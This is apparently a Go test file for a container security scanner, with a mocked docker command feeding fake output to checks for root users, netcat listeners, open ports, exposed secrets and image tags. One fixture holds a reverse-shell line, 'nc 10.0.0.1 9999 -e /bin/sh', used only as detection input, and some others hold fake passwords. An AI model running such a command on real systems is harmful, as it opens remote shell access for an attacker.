package checks

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func setupMockDocker(t *testing.T, subcmdOutputs map[string]string) func() {
	t.Helper()
	dir := t.TempDir()

	var sb strings.Builder
	sb.WriteString("#!/bin/sh\n")
	for subcmd, output := range subcmdOutputs {
		outFile := filepath.Join(dir, "out_"+subcmd)
		if err := os.WriteFile(outFile, []byte(output), 0644); err != nil {
			t.Fatal(err)
		}
		sb.WriteString(fmt.Sprintf("[ \"$1\" = \"%s\" ] && cat %s && exit 0\n", subcmd, outFile))
	}
	sb.WriteString("exit 0\n")

	dockerPath := filepath.Join(dir, "docker")
	if err := os.WriteFile(dockerPath, []byte(sb.String()), 0755); err != nil {
		t.Fatal(err)
	}

	origPath := os.Getenv("PATH")
	os.Setenv("PATH", dir+":"+origPath)
	return func() { os.Setenv("PATH", origPath) }
}

const testContainerID = "abcdef123456789"

// ---- CheckRootUser ----

func TestCheckRootUser_Root(t *testing.T) {
	restore := setupMockDocker(t, map[string]string{"exec": "0\n"})
	defer restore()

	result := CheckRootUser(testContainerID)

	if result.Status != "fail" {
		t.Errorf("expected fail, got %s", result.Status)
	}
	if result.Severity != "critical" {
		t.Errorf("expected critical, got %s", result.Severity)
	}
	if len(result.Issues) == 0 {
		t.Error("expected issues for root user")
	}
}

func TestCheckRootUser_NonRoot(t *testing.T) {
	restore := setupMockDocker(t, map[string]string{"exec": "1000\n"})
	defer restore()

	result := CheckRootUser(testContainerID)

	if result.Status != "pass" {
		t.Errorf("expected pass, got %s", result.Status)
	}
	if len(result.Issues) != 0 {
		t.Errorf("expected no issues, got %v", result.Issues)
	}
}

// ---- CheckNetcatListener ----

func TestCheckNetcatListener_NotRunning(t *testing.T) {
	restore := setupMockDocker(t, map[string]string{"exec": ""})
	defer restore()

	result := CheckNetcatListener(testContainerID)

	if result.Status != "pass" {
		t.Errorf("expected pass, got %s", result.Status)
	}
}

func TestCheckNetcatListener_Detected(t *testing.T) {
	restore := setupMockDocker(t, map[string]string{"exec": "root  123  nc -l 4444\n"})
	defer restore()

	result := CheckNetcatListener(testContainerID)

	if result.Status != "fail" {
		t.Errorf("expected fail, got %s", result.Status)
	}
	if result.Severity != "critical" {
		t.Errorf("expected critical, got %s", result.Severity)
	}
}

// ---- CheckRemoteShell ----

func TestCheckRemoteShell_NoShell(t *testing.T) {
	restore := setupMockDocker(t, map[string]string{"exec": ""})
	defer restore()

	result := CheckRemoteShell(testContainerID)

	if result.Status != "pass" {
		t.Errorf("expected pass, got %s", result.Status)
	}
}

func TestCheckRemoteShell_Detected(t *testing.T) {
	restore := setupMockDocker(t, map[string]string{"exec": "root  42  nc 10.0.0.1 9999 -e /bin/sh\n"})
	defer restore()

	result := CheckRemoteShell(testContainerID)

	if result.Status != "fail" {
		t.Errorf("expected fail, got %s", result.Status)
	}
	if result.Severity != "critical" {
		t.Errorf("expected critical, got %s", result.Severity)
	}
}

// ---- CheckNetcatProcess ----

func TestCheckNetcatProcess_NotRunning(t *testing.T) {
	restore := setupMockDocker(t, map[string]string{"exec": ""})
	defer restore()

	result := CheckNetcatProcess(testContainerID)

	if result.Status != "pass" {
		t.Errorf("expected pass, got %s", result.Status)
	}
}

func TestCheckNetcatProcess_Running(t *testing.T) {
	restore := setupMockDocker(t, map[string]string{"exec": "root  99  nc -l 1234\n"})
	defer restore()

	result := CheckNetcatProcess(testContainerID)

	if result.Status != "fail" {
		t.Errorf("expected fail, got %s", result.Status)
	}
	if result.Severity != "critical" {
		t.Errorf("expected critical, got %s", result.Severity)
	}
}

// ---- CheckOpenPort4444 ----

func TestCheckOpenPort4444_Closed(t *testing.T) {
	restore := setupMockDocker(t, map[string]string{"exec": ""})
	defer restore()

	result := CheckOpenPort4444(testContainerID)

	if result.Status != "pass" {
		t.Errorf("expected pass, got %s", result.Status)
	}
}

func TestCheckOpenPort4444_Open(t *testing.T) {
	restore := setupMockDocker(t, map[string]string{"exec": "tcp LISTEN 0.0.0.0:4444 0.0.0.0:*\n"})
	defer restore()

	result := CheckOpenPort4444(testContainerID)

	if result.Status != "fail" {
		t.Errorf("expected fail, got %s", result.Status)
	}
	if result.Severity != "critical" {
		t.Errorf("expected critical, got %s", result.Severity)
	}
}

// ---- CheckWritableFS ----

func TestCheckWritableFS_Writable(t *testing.T) {
	restore := setupMockDocker(t, map[string]string{"exec": "OK\n"})
	defer restore()

	result := CheckWritableFS(testContainerID)

	if result.Status != "warn" {
		t.Errorf("expected warn, got %s", result.Status)
	}
	if result.Severity != "medium" {
		t.Errorf("expected medium, got %s", result.Severity)
	}
}

func TestCheckWritableFS_ReadOnly(t *testing.T) {
	restore := setupMockDocker(t, map[string]string{"exec": "FAIL\n"})
	defer restore()

	result := CheckWritableFS(testContainerID)

	if result.Status != "pass" {
		t.Errorf("expected pass, got %s", result.Status)
	}
}

// ---- CheckOpenPorts ----

func TestCheckOpenPorts_NoTools(t *testing.T) {
	restore := setupMockDocker(t, map[string]string{"exec": "no network tools\n"})
	defer restore()

	result := CheckOpenPorts(testContainerID)

	if result.Status != "warn" {
		t.Errorf("expected warn, got %s", result.Status)
	}
}

func TestCheckOpenPorts_Clean(t *testing.T) {
	output := "tcp  LISTEN  0.0.0.0:80  0.0.0.0:*\ntcp  LISTEN  0.0.0.0:443  0.0.0.0:*\n"
	restore := setupMockDocker(t, map[string]string{"exec": output})
	defer restore()

	result := CheckOpenPorts(testContainerID)

	if result.Status != "pass" {
		t.Errorf("expected pass, got %s", result.Status)
	}
}

func TestCheckOpenPorts_Suspicious(t *testing.T) {
	output := "tcp  LISTEN  0.0.0.0:4444  0.0.0.0:*\n"
	restore := setupMockDocker(t, map[string]string{"exec": output})
	defer restore()

	result := CheckOpenPorts(testContainerID)

	if result.Status != "fail" {
		t.Errorf("expected fail, got %s", result.Status)
	}
	if result.Severity != "high" {
		t.Errorf("expected high, got %s", result.Severity)
	}
}

func TestCheckOpenPorts_ManyPorts(t *testing.T) {
	lines := []string{}
	for i := 1024; i < 1030; i++ {
		lines = append(lines, fmt.Sprintf("tcp  LISTEN  0.0.0.0:%d  0.0.0.0:*", i))
	}
	output := strings.Join(lines, "\n") + "\n"
	restore := setupMockDocker(t, map[string]string{"exec": output})
	defer restore()

	result := CheckOpenPorts(testContainerID)

	if result.Status != "warn" {
		t.Errorf("expected warn for many ports, got %s", result.Status)
	}
	if result.Severity != "medium" {
		t.Errorf("expected medium, got %s", result.Severity)
	}
}

// ---- CheckConnections ----

func TestCheckConnections_NoTools(t *testing.T) {
	restore := setupMockDocker(t, map[string]string{"exec": "no tools\n"})
	defer restore()

	result := CheckConnections(testContainerID)

	if result.Status != "warn" {
		t.Errorf("expected warn, got %s", result.Status)
	}
}

func TestCheckConnections_FewConnections(t *testing.T) {
	output := "tcp  ESTAB  127.0.0.1:80  127.0.0.1:12345\n"
	restore := setupMockDocker(t, map[string]string{"exec": output})
	defer restore()

	result := CheckConnections(testContainerID)

	if result.Status != "pass" {
		t.Errorf("expected pass, got %s", result.Status)
	}
}

func TestCheckConnections_ManyConnections(t *testing.T) {
	lines := []string{}
	for i := 0; i < 12; i++ {
		lines = append(lines, fmt.Sprintf("tcp  ESTAB  127.0.0.1:80  10.0.0.%d:9999", i))
	}
	output := strings.Join(lines, "\n") + "\n"
	restore := setupMockDocker(t, map[string]string{"exec": output})
	defer restore()

	result := CheckConnections(testContainerID)

	if result.Status != "warn" {
		t.Errorf("expected warn for many connections, got %s", result.Status)
	}
}

// ---- CheckEnvironment ----

func TestCheckEnvironment_NoSensitive(t *testing.T) {
	restore := setupMockDocker(t, map[string]string{"exec": "PATH=/usr/bin\nHOME=/root\n"})
	defer restore()

	result := CheckEnvironment(testContainerID)

	if result.Status != "pass" {
		t.Errorf("expected pass, got %s", result.Status)
	}
}

func TestCheckEnvironment_WithSensitive(t *testing.T) {
	restore := setupMockDocker(t, map[string]string{"exec": "PATH=/usr/bin\nDB_PASSWORD=secret123\n"})
	defer restore()

	result := CheckEnvironment(testContainerID)

	if result.Status != "fail" {
		t.Errorf("expected fail, got %s", result.Status)
	}
	if result.Severity != "high" {
		t.Errorf("expected high, got %s", result.Severity)
	}
	if len(result.Issues) == 0 {
		t.Error("expected issues for sensitive env vars")
	}
}

// ---- CheckImageHistory ----

func TestCheckImageHistory_Clean(t *testing.T) {
	restore := setupMockDocker(t, map[string]string{
		"inspect": "sha256:abc123\n",
		"history": "/bin/sh -c apt-get install curl\n",
	})
	defer restore()

	result := CheckImageHistory(testContainerID)

	if result.Status != "pass" {
		t.Errorf("expected pass, got %s", result.Status)
	}
}

func TestCheckImageHistory_WithSecrets(t *testing.T) {
	restore := setupMockDocker(t, map[string]string{
		"inspect": "sha256:abc123\n",
		"history": "/bin/sh -c echo PASSWORD=hunter2 > /etc/env\n",
	})
	defer restore()

	result := CheckImageHistory(testContainerID)

	if result.Status != "fail" {
		t.Errorf("expected fail, got %s", result.Status)
	}
	if result.Severity != "high" {
		t.Errorf("expected high, got %s", result.Severity)
	}
}

// ---- CheckImageVersion ----

func TestCheckImageVersion_LatestTag(t *testing.T) {
	restore := setupMockDocker(t, map[string]string{
		"inspect": "sha256:abc123\n",
		"images":  "myapp:latest sha256:abc123\n",
	})
	defer restore()

	result := CheckImageVersion(testContainerID)

	if result.Status != "warn" {
		t.Errorf("expected warn for latest tag, got %s", result.Status)
	}
}

func TestCheckImageVersion_VersionedTag(t *testing.T) {
	restore := setupMockDocker(t, map[string]string{
		"inspect": "sha256:abc123\n",
		"images":  "myapp:1.2.3 sha256:abc123\n",
	})
	defer restore()

	result := CheckImageVersion(testContainerID)

	if result.Status != "pass" {
		t.Errorf("expected pass for versioned tag, got %s", result.Status)
	}
}

func TestCheckImageVersion_InspectError(t *testing.T) {
	restore := setupMockDocker(t, map[string]string{})
	defer restore()

	result := CheckImageVersion(testContainerID)

	if result.Status == "" {
		t.Error("expected a status")
	}
}
